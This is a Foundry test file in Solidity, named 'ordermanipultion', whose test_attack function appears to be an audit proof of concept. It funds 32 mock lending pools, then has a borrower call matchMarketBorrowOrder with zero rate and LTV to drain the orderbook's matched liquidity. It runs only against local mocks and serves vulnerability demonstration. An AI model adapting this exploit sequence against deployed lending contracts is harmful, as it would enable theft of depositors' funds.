// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "../lib/forge-std/src/Test.sol";
import {TreeState, PreviewBorrowParams} from "../src/interface/Types.sol";
import {Orderbook} from "../src/Orderbook.sol";
import {OrderbookFactory} from "../src/OrderbookFactory.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockPool} from "./mocks/MockPool.sol";
import {MockIRM} from "./mocks/MockIRM.sol";
import {IOrderbook} from "../src/interface/IOrderbook.sol";
import {BorrowerLimitOrder} from "../src/interface/Types.sol";
import {AugmentedRedBlackTreeLib} from "../src/libraries/AugmentedRedBlackTreeLib.sol";
import "forge-std/console.sol";

contract ordermanipultion is Test {
    OrderbookFactory factory;
    Orderbook orderbook;
    MockERC20 loanToken;
    MockERC20 collateralToken;
    MockPoolFactory poolFactory;
    MockPool[] pools;
    MockIRM irm;

    AugmentedRedBlackTreeLib.Tree lenderTree;

    address admin = makeAddr("admin");
    address poolManager = makeAddr("poolManager");
    address feeRecipient = makeAddr("feeRecipient");
    address borrower = makeAddr("borrower");
    address lender = makeAddr("lender");
    address keeper = makeAddr("keeper");

    function setUp() public {
        vm.startPrank(admin);

        // Deploy tokens
        loanToken = new MockERC20("Loan Token", "LOAN");
        collateralToken = new MockERC20("Collateral Token", "COLL");

        // Deploy factory
        factory = new OrderbookFactory(admin);

        // Deploy and enable IRM
        irm = new MockIRM(0.01e18, 0.1e18, 1e18, 0.8e18);
        factory.setIrm(address(irm), true);

        // Deploy pool factory
        poolFactory = new MockPoolFactory();

        // Create orderbook
        factory.setPoolManager(poolManager, true);
        factory.setPoolFactory(address(poolFactory), true);
        factory.setKeeper(keeper, true);
        address orderbookAddress =
            factory.createOrderbook(address(loanToken), address(collateralToken), address(feeRecipient));
        orderbook = Orderbook(orderbookAddress);
        for (uint256 i = 0; i < 32; i++) {
            MockPool pool = poolFactory.createPool(address(loanToken), address(orderbook), address(irm), address(collateralToken));
            pools.push(pool);
        }
        vm.stopPrank();
        
        // Setup accounts with tokens
        loanToken.mint(lender, 10000e18);
        collateralToken.mint(borrower, 10000e18);

        // Whitelist pool
        vm.startPrank(poolManager);
        for (uint256 i = 0; i < pools.length; i++) {
            orderbook.whitelistPool(address(pools[i]), address(poolFactory));
        }
        vm.stopPrank();
        
        
    }
    
    function test_attack() public {
        // Setup: initial lenders deposits equaly across 32 pools
        //uint256 depositeAmount = 10e18;
        uint256 depositeAmount = 100e18;
        
        // Lender approves + deposits to all 32 pools
        uint256[] memory poolOrderIds;
        vm.startPrank(lender);
        for (uint256 i = 0; i < pools.length; i++) {
            loanToken.approve(address(pools[i]), depositeAmount);
            pools[i].deposit(depositeAmount, lender);
            vm.warp(block.timestamp + 5 seconds);
            // ensure each pool created orders in the orderbook
            poolOrderIds = orderbook.getPoolOrders(address(pools[i]));
            assertGt(poolOrderIds.length, 0);
            //depositeAmount += 1e18;
        }
        uint64 ltv = uint64(type(uint64).max - 0.5e18);
        uint256 compositeKey = orderbook.getCompositkey(1e18, ltv);
        console.log("Composite Key at (1e18, 0.5e18):", compositeKey);
        uint256 X = orderbook.getEntryAmount(compositeKey, 0);
        console.log("Initial X at (1e18, 0.5e18):", X / 1e18);
        
        uint256 poolBalance;
        // for (uint256 i = 0; i < pools.length; i++) {
        //     poolBalance = loanToken.balanceOf(address(pools[i]));
        //     console.log("Pool", i, "loan token balance:", poolBalance / 1e18);
        // }
        poolBalance = loanToken.balanceOf(address(pools[3]));
        console.log("Pool", "loan token balance:", poolBalance / 1e18);
        vm.stopPrank();

        // Fast-forward some time
        vm.warp(block.timestamp + 1 hours);

        // -------------------------
        // Borrow parameters
        // -------------------------
        uint256 borrowAmount = 305e18; // borrow total deposited amount
        uint256 minAmountExpected = 0; // 
        uint256 collateralBuffer = 0.5e18;

        //Preview to get collateral required for the borrower (keeps test realistic)
        // (,, uint256 collateralRequired,) = orderbook.previewBorrow(
        //     PreviewBorrowParams({
        //         borrower: borrower,
        //         amount: borrowAmount,
        //         collateralBuffer: collateralBuffer,
        //         rate: 1e18, // matching rate of both pools
        //         ltv: 0.5e18, // matching ltv of both pools
        //         isMarketOrder: true,
        //         isCollateral: false
        //     })
        // );
        // console.log("Collateral required for borrow:", collateralRequired / 1e18);

        vm.startPrank(borrower);
        collateralToken.approve(address(orderbook), 1000e18);
        //orderbook.matchMarketBorrowOrder(borrowAmount, minAmountExpected, collateralBuffer, 0.5e18, 1e18);
        orderbook.matchMarketBorrowOrder(borrowAmount, minAmountExpected, collateralBuffer, 0, 0);
        uint256 borrowerBalance = loanToken.balanceOf(borrower);
        
        console.log("Borrower loan token balance after borrow:", borrowerBalance / 1e18);
        for (uint256 i = 0; i < pools.length; i++) {
            poolBalance = loanToken.balanceOf(address(pools[i]));
            console.log("Pool", i, "loan token balance:", poolBalance / 1e18);
        }
        poolOrderIds = orderbook.getPoolOrders(address(pools[2]));
        console.log("Pool 2 order ids count after borrow:", poolOrderIds.length);
        orderbook.matchMarketBorrowOrder(20e18, minAmountExpected, collateralBuffer, 0, 0);
        for (uint256 i = 0; i < pools.length; i++) {
            poolBalance = loanToken.balanceOf(address(pools[i]));
            console.log("Pool", i, "loan token balance:", poolBalance / 1e18);
        }
        //vm.stopPrank();
        
        // uint256 compositeKey = orderbook.getCompositkey(1e18, 0.5e18);
        // console.log("Composite Key at (1e18, 0.5e18):", compositeKey);
        // uint256 X = orderbook.getEntryAmount(compositeKey, 0);
        // console.log("Initial X at (1e19, 0.5e18):", X / 1e18);
        vm.stopPrank();
    }

}